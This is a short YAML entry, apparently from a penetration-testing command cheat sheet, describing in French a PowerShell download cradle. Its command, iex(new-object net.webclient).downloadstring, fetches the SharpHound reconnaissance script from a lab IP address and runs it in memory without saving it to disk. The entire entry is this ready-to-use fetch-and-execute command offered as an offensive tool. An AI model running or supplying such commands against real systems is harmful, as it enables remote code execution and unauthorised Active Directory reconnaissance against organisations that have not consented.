---
description: |
  (New-Object Net.WebClient).DownloadString est une commande PowerShell qui utilise la classe .NET WebClient pour télécharger et EXÉCUTER un fichier à partir du serveur sans l'enregistrer.

  Command Reference:

  	Location of file: http://10.10.14.21:8999/SharpHound.ps1

command: |
  iex(new-object net.webclient).downloadstring("http://10.10.14.21:8999/SharpHound.ps1")
items:
  - Shell
OS:
  - Windows
  - Approved-tool
attack_types:
  - General
references:
  - https://learn.microsoft.com/de-de/dotnet/api/system.net.webclient.downloadstring?view=net-5.0
  - https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters
---
